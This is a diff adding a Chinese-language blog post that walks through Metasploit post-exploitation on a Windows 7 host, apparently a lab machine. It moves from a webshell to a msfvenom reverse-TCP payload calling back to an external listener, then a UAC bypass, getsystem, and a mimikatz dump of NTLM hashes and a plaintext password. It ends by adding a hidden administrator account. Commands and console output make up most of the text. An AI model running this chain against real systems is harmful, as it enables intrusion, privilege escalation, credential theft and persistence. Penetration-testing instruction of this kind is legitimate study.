@@ -1,0 +1,331 @@
++++
+date = "2018-02-26T13:43:20+08:00"
+description = ""
+draft = false
+tags = ["msf","elevate privileges"]
+title = "Metasploit简单提权"
+topics = ["Pentest"]
+
++++
+
+### 0x00 前提
+获得了一个shell：```http://10.11.11.20/a.php```  
+外网安装msf的主机：114.115.123.123
+
+### 0x01 查看主机基本信息
+菜刀连接shell，终端执行systeminfo
+```
+C:\Apps\phpStudy\WWW\> systeminfo
+
+主机名:           REBER-WIN7
+OS 名称:          Microsoft Windows 7 专业版
+OS 版本:          6.1.7600 ��ȱ Build 7600
+OS 制造商:        Microsoft Corporation
+OS 配置:          独立服务器
+OS 构件类型:       Multiprocessor Free
+注册的所有人:      reber
+注册的组织:       
+产品 ID:          00371-868-0000007-85272
+初始安装日期:      2017/12/26, 7:23:00
+系统启动时间:      2018/2/26, 9:52:14
+系统制造商:        Parallels Software International Inc.
+系统型号:          Parallels Virtual Platform
+系统类型:          x64-based PC
+处理器:           安装了 1 个处理器。
+                 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz
+BIOS 版本:        Parallels Software International Inc. 12.0.2 (41353), 2016/9/15
+Windows 目录:     C:\Windows
+系统目录:          C:\Windows\system32
+启动设备:          \Device\HarddiskVolume1
+系统区域设置:      zh-cn;中文(中国)
+输入法区域设置:    zh-cn;中文(中国)
+时区:             (GMT+08:00) 北京
+物理内存总量:      4,096 MB
+可用的物理内存:    2,897 MB
+页面文件: 最大值:  8,189 MB
+页面文件: 可用:    6,794 MB
+页面文件: 使用中:  1,395 MB
+页面文件位置:      C:\pagefile.sys
+域:              REBER
+登录服务器:       \\REBER-WIN7
+修补程序:         安装了 1 个修补程序。
+                  [01]: KB958488
+网卡:            安装了 1 个 NIC。
+                  [01]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接 3
+                      启用 DHCP:   是
+                      DHCP 服务器: 10.11.11.1
+                      IP 地址
+                        [01]: 10.11.11.20
+                        [02]: fe80::d509:b75f:4cc5:5628
+```
+
+### 0x02 弹出会话到Metasploit
+生成payload，然后用菜刀上传到目标服务器
+```bash
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=114.115.123.123 LPORT=8888 -f exe -o aa.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Final size of exe file: 73802 bytes
+Saved as: aa.exe
+```
+msf监听，等待payload执行
+```
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+msf exploit(multi/handler) > set LPORT 8888
+LPORT => 8888
+msf exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     0.0.0.0          yes       The listen address
+   LPORT     8888             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+msf exploit(multi/handler) >
+[*] Started reverse TCP handler on 0.0.0.0:8888
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:8888
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) >
+```
+通过菜刀执行上传的aa.exe，菜刀显示执行错误，但是msf已经成功与目标建立了一个会话
+```
+msf exploit(multi/handler) >
+[*] Sending stage (179779 bytes) to 211.123.123.72
+[*] Meterpreter session 1 opened (192.168.0.195:8888 -> 211.123.123.72:34576) at 2018-02-26 12:26:32 +0800
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                    Connection
+  --  ----  ----                     -----------                    ----------
+  1         meterpreter x86/windows  REBER-WIN7\reber @ REBER-WIN7  192.168.0.195:8888 -> 211.123.123.72:34576 (10.11.11.20)
+
+msf exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > ls
+Listing: C:\Users\reber\Desktop
+===============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100777/rwxrwxrwx  73802   fil   2018-02-26 12:02:38 +0800  aa.exe
+100666/rw-rw-rw-  282     fil   2017-12-25 15:24:08 +0800  desktop.ini
+100666/rw-rw-rw-  9029    fil   2018-02-07 00:14:51 +0800  ftptrace.txt
+100666/rw-rw-rw-  108     fil   2018-02-06 23:55:17 +0800  users.dat
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(multi/handler) >
+```
+
+### 0x03 提权
+通过systeminfo得知为Win7主机，只有一个补丁，直接尝试绕过UAC进行提权
+```
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac
+msf exploit(windows/local/bypassuac) > options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PS   H, EXE)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > set session 1
+session => 1
+msf exploit(windows/local/bypassuac) > run
+
+[*] Started reverse TCP handler on 192.168.0.195:4444
+[*] UAC is Enabled, checking level...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
+[*] Exploit completed, but no session was created.
+msf exploit(windows/local/bypassuac) > options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION    1                yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PS   H, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process,    none)
+   LHOST     192.168.0.195    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > set LHOST 114.115.123.123
+LHOST => 114.115.123.123
+msf exploit(windows/local/bypassuac) > set LPORT 6666
+LPORT => 6666
+msf exploit(windows/local/bypassuac) > options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION    1                yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     114.115.123.123   yes       The listen address
+   LPORT     6666             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > run
+
+[*] Started reverse TCP handler on 114.115.123.123:6666
+[*] UAC is Enabled, checking level...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (179779 bytes) to 211.123.123.72
+[*] Meterpreter session 2 opened (192.168.0.195:6666 -> 211.123.123.72:36519) at 2018-02-26 12:52:54 +0800
+
+meterpreter > getuid
+Server username: REBER-WIN7\reber
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+```
+
+### 0x04 获得用户名密码
+```
+meterpreter > load mimikatz
+Loading extension mimikatz...Success.
+meterpreter > msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID   Package    Domain        User           Password
+------   -------    ------        ----           --------
+0;69053  NTLM       REBER-WIN7    reber          lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
+0;69036  NTLM       REBER-WIN7    reber          lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
+0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
+0;996    Negotiate  REBER         REBER-WIN7$    n.s. (Credentials KO)
+0;27026  NTLM                                    n.s. (Credentials KO)
+0;999    NTLM       REBER         REBER-WIN7$    n.s. (Credentials KO)
+
+meterpreter > kerberos
+[+] Running as SYSTEM
+[*] Retrieving kerberos credentials
+kerberos credentials
+====================
+
+AuthID   Package    Domain        User           Password
+------   -------    ------        ----           --------
+0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE
+0;996    Negotiate  REBER         REBER-WIN7$
+0;27026  NTLM
+0;999    NTLM       REBER         REBER-WIN7$
+0;69053  NTLM       REBER-WIN7    reber          123456
+0;69036  NTLM       REBER-WIN7    reber          123456
+
+meterpreter >
+```
+
+### 0x05 添加用户
+```
+meterpreter > shell
+Process 2020 created.
+Channel 1 created.
+Microsoft Windows [▒汾 6.1.7600]
+▒▒Ȩ▒▒▒▒ (c) 2009 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒
+
+C:\Windows\system32>net user hacker 123456 /add
+net user hacker 123456 /add
+▒▒▒▒ɹ▒▒▒ɡ▒
+
+
+C:\Windows\system32>net localgroup administrators hacker /add
+net localgroup administrators hacker /add
+▒▒▒▒ɹ▒▒▒ɡ▒
+```
